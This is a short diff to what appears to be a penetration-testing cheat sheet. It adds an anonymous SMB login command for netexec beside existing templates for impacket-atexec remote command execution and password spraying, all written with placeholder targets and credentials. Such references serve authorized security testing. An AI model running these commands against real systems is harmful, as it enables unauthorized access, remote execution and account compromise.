@@ -475,6 +475,8 @@ impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
 ```
 - netexec
 ```sh
+# anonymous
+netexec smb 'IP' -u ' ' -p ''
 # Password Spraying
 netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
 # NTHASH
